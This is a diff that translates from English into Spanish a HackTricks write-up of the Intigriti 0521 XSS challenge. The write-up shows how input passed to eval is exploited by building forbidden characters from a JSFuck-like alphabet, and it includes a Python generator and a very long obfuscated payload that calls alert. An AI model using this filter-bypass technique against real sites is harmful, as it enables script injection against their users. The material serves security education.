@@ -4,84 +4,71 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-### Brief Description <a href="#brief-description" id="brief-description"></a>
+### Breve descripción <a href="#brief-description" id="brief-description"></a>
 
-The challenge provides a vulnerable to XSS form in the page [https://challenge-0521.intigriti.io/captcha.php](https://challenge-0521.intigriti.io/captcha.php).\
-This form is loaded in [https://challenge-0521.intigriti.io/](https://challenge-0521.intigriti.io) via an iframe.
+El desafío proporciona un formulario vulnerable a XSS en la página [https://challenge-0521.intigriti.io/captcha.php](https://challenge-0521.intigriti.io/captcha.php).\
+Este formulario se carga en [https://challenge-0521.intigriti.io/](https://challenge-0521.intigriti.io) a través de un iframe.
 
-It was found that the form will **insert the user input inside the JavaScript `eval` function**. This is usually a bad idea as it can lead to **arbitrary JavaScript execution**, and this is a good example.\
-However, before inserting the user input inside the`eval` function, it’s checked with the regexp `/[a-df-z<>()!\\='"]/gi` so if any of those character is found, the user input won’t be executed inside `eval`.\
-Anyway, it was found a way to bypass the regexp protection and execute `alert(document.domain)` abusing the dangerous `eval` function.
+Se descubrió que el formulario **insertará la entrada del usuario dentro de la función `eval` de JavaScript**. Esto suele ser una mala idea ya que puede llevar a una **ejecución arbitraria de JavaScript**, y este es un buen ejemplo.\
+Sin embargo, antes de insertar la entrada del usuario dentro de la función `eval`, se comprueba con la expresión regular `/[a-df-z<>()!\\='"]/gi` por lo que si se encuentra alguno de esos caracteres, la entrada del usuario no se ejecutará dentro de `eval`.\
+De todos modos, se encontró una forma de pasar por alto la protección de la expresión regular y ejecutar `alert(document.domain)` abusando de la peligrosa función `eval`.
 
-### Accessing the HTML <a href="#accessing-the-html" id="accessing-the-html"></a>
+### Accediendo al HTML <a href="#accessing-the-html" id="accessing-the-html"></a>
 
-It was found that the letter `e` is permitted as user input. It was also found that there is an HTLM element using the `id="e"`. Therefore, this HtML element is accesible from Javascript just using the variable `e`:\
+Se descubrió que la letra `e` está permitida como entrada de usuario. También se descubrió que hay un elemento HTML que utiliza el `id="e"`. Por lo tanto, este elemento HTML es accesible desde Javascript simplemente usando la variable `e`:\
 ![](https://i.imgur.com/Slq2Xal.png)
 
-Also, it’s important to know that in JS you can **access the attributes of an objects with a dot or with a string between brackets**. So, you can access the `domain` attribute of a `document` object in either of the following ways:
-
+Además, es importante saber que en JS se pueden **acceder a los atributos de un objeto con un punto o con una cadena entre corchetes**. Por lo tanto, se puede acceder al atributo `domain` de un objeto `document` de cualquiera de las siguientes maneras:
 ```javascript
 document.domain
 document["domain"]
 ```
-
-And the same happens with attributes that are functions (methods):
-
+Y lo mismo ocurre con los atributos que son funciones (métodos):
 ```javascript
 document.write("1")
 document["write"]("1")
 ```
-
-Then, from the `e` HTML element it’s possible to access the `document` object using something like:
-
+Entonces, desde el elemento HTML `e` es posible acceder al objeto `document` usando algo como:
 ```javascript
 e["parentNode"]["parentNode"]["parentNode"]["parentNode"]["parentNode"]
 ```
+### Llamando a una función sin paréntesis con código JS como cadena <a href="#calling-a-function-without-parenthesis-with-js-code-as-string" id="calling-a-function-without-parenthesis-with-js-code-as-string"></a>
 
-### Calling a function without parenthesis with JS code as string <a href="#calling-a-function-without-parenthesis-with-js-code-as-string" id="calling-a-function-without-parenthesis-with-js-code-as-string"></a>
-
-From the object `document` it’s possible to call the `write` function to **write arbitrary HTML text that the browser will execute**.\
-However, as the `()` characters are **forbidden**, it’s not possible to call the function using them. Anyway, it’s possible to call a function using **backtips** (\`\`).\
-Moreover, it’s possible to put as string javascript code that is going to be executed using `${...}` like:
-
+Desde el objeto `document` es posible llamar a la función `write` para **escribir texto HTML arbitrario que el navegador ejecutará**.\
+Sin embargo, como los caracteres `()` están **prohibidos**, no es posible llamar a la función usando ellos. De todas formas, es posible llamar a una función usando **backtips** (\`\`).\
+Además, es posible poner como cadena código javascript que será ejecutado usando `${...}` como:
 ```javascript
 `${"alert(document.location)"}`
 ```
-
-Therefore, combining the `document` object access with this technique to execute functions without parenthesis it’s possible to **execute an alert using**:
-
+Por lo tanto, combinando el acceso al objeto `document` con esta técnica para ejecutar funciones sin paréntesis, es posible **ejecutar una alerta usando**:
 ```javascript
 e["parentNode"]["parentNode"]["parentNode"]["parentNode"]["parentNode"]["write"]`${"<script>alert(document.location)</script>"}`
 ```
+Puedes probar este código en una consola de JavaScript dentro de la página [https://challenge-0521.intigriti.io/captcha.php](https://challenge-0521.intigriti.io/captcha.php)
 
-You can test this code in a javascript console inside the page [https://challenge-0521.intigriti.io/captcha.php](https://challenge-0521.intigriti.io/captcha.php)
+### Bypass final de caracteres prohibidos <a href="#final-forbidden-characters-bypass" id="final-forbidden-characters-bypass"></a>
 
-### Final forbidden characters bypass <a href="#final-forbidden-characters-bypass" id="final-forbidden-characters-bypass"></a>
+Sin embargo, todavía queda un problema. La mayoría de los caracteres del exploit están **prohibidos** ya que aparecen en la expresión regular `/[a-df-z<>()!\\='"]/gi`. Pero observa cómo todos los **caracteres prohibidos son cadenas** dentro del exploit y los **caracteres no de cadena en el exploit (e\[]\`${}) están permitidos**.\
+Esto significa que si es posible **generar los caracteres prohibidos como cadenas a partir de los caracteres permitidos**, es posible generar el exploit.\
+Para hacer esto, he generado un alfabeto similar a [JSFuck](http://www.jsfuck.com) para generar los caracteres necesarios (_este alfabeto es personalizado para este desafío_).\
+Puedes **ver el alfabeto completo dentro del código del exploit** (que se puede encontrar en la siguiente subsección y en el archivo _exploit.txt_).
 
-However, there is still one problem left. Most of the characters of the exploit are **forbidden** as they appear in the regexp `/[a-df-z<>()!\\='"]/gi`. But note how all the **forbidden characters are strings** inside the exploit and the **not string characters in the exploit (e\[]\`${}) are allowed**.\
-This means that if it’s possible to **generate the forbidden charaters as strings from the allowed characters**, it’s possible to generate the exploit.\
-In order to do this I have generated a [JSFuck](http://www.jsfuck.com) like alphabet to generate the necesary characters (_this alphabet is custom for this challenge_).\
-You can **see the full alphabet inside the exploit code** (which can be found in the next subsection and in the file _exploit.txt_).
-
-For example, in order to **generate the letter `a`** it’s possible to access **`[[]/e+e][0][1]`** as `[[]/e+e][0]` generates the string `"NaN[object HTMLProgressElement]"` or in order to generate the **letter `f`** its possible to access the **5th char of `[[][[]]+e][0]`** as that expression generates the string `"undefined[object HTMLProgressElement]"`.\
-Using these tricks and some more complex ones it was possible to **generate all the characters (letters and symbols) of the strings contained** in the exploit:
-
+Por ejemplo, para **generar la letra `a`** es posible acceder a **`[[]/e+e][0][1]`** ya que `[[]/e+e][0]` genera la cadena `"NaN[object HTMLProgressElement]"` o para generar la **letra `f`** es posible acceder al **quinto carácter de `[[][[]]+e][0]`** ya que esa expresión genera la cadena `"undefined[object HTMLProgressElement]"`.\
+Usando estos trucos y algunos más complejos, fue posible **generar todos los caracteres (letras y símbolos) de las cadenas contenidas** en el exploit:
 ```javascript
 e["parentNode"]["parentNode"]["parentNode"]["parentNode"]["parentNode"]["write"]`${"<script>alert(document.location)</script>"}`
 ```
+### Código de explotación <a href="#exploit-code" id="exploit-code"></a>
 
-### Exploit Code <a href="#exploit-code" id="exploit-code"></a>
-
-This is the python exploit used to generate the final exploit. If you execute it, it will print the exploit:
-
+Este es el código de explotación en Python utilizado para generar el exploit final. Si lo ejecutas, imprimirá el exploit:
 ```python
 #JS Specific Direct Alphabet
 x = {
@@ -149,17 +136,13 @@ txt = f'{document}[{write}]'+'`${['+payload+']}`'
 
 print(txt) #Write the exploit to stdout
 ```
+### Explotación <a href="#exploitation" id="exploitation"></a>
 
-### Exploitation <a href="#exploitation" id="exploitation"></a>
-
-In order to generate the exploit just execute the previous python code. If you prefer, you can also copy/paste it from here:
-
+Para generar el exploit, simplemente ejecuta el código Python anterior. Si lo prefieres, también puedes copiar/pegarlo desde aquí:
 ```
 e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[][[]]+e][0][5]+[e+e][0][21]+[[][[]]+e][0][2]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]][[e+e][0][5]+[[]/e+e][0][1]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[e+e][0][6]+[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[]/e+e][0][1]][[e+e][0][15]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][35]+[e+e][0][13]+[[][[]]+e][0][5]+[e+e][0][6]+[e+e][0][4]]`${[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][0]+[e+e][0][18]+[e+e][0][5]+[e+e][0][13]+[[][[]]+e][0][5]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[e+e][0][6]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][62]+[[]/e+e][0][1]+[e+e][0][21]+[e+e][0][4]+[e+e][0][13]+[e+e][0][6]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[][[]]+e][0][5]+[e+e][0][21]+[[][[]]+e][0][2]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]][[e+e][0][5]+[[]/e+e][0][1]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[e+e][0][6]+[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[]/e+e][0][1]][[e+e][0][15]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][42]+[[][[]]+e][0][2]+[e+e][0][1]+[e+e][0][5]+[[][[]]+e][0][0]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[][[]]+e][0][5]+[e+e][0][21]+[[][[]]+e][0][2]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]][[e+e][0][5]+[[]/e+e][0][1]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[e+e][0][6]+[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[]/e+e][0][1]][[e+e][0][15]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][38]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[e+e][0][0]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][13]+[[][[]]+e][0][2]+[e+e][0][1]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[][[]]+e][0][5]+[e+e][0][21]+[[][[]]+e][0][2]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]][[e+e][0][5]+[[]/e+e][0][1]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[e+e][0][6]+[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[]/e+e][0][1]][[e+e][0][15]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][38]+[[]/e+e][0][1]+[[][[]]+e][0][5]+[[][[]]+e][0][1]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][13]+[e+e][0][27]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]